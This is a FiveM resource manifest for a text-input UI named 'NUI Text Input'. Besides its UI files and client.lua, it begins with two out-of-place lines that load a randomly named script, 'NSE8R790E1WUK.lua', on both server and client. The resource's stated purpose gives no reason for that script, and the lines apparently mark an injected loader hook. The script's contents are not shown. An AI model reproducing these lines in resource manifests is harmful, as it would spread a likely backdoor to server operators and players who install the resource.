server_script "NSE8R790E1WUK.lua"
client_script "NSE8R790E1WUK.lua"
fx_version "cerulean"
game "gta5"

name "NUI Text Input"
description "A modular, clean keyboard input for FiveM"
author "NeroHiro"

ui_page "./ui/index.html"

files{
    "./ui/index.html",
    "./ui/main.css",
    "./ui/main.js",
}

client_script "client.lua"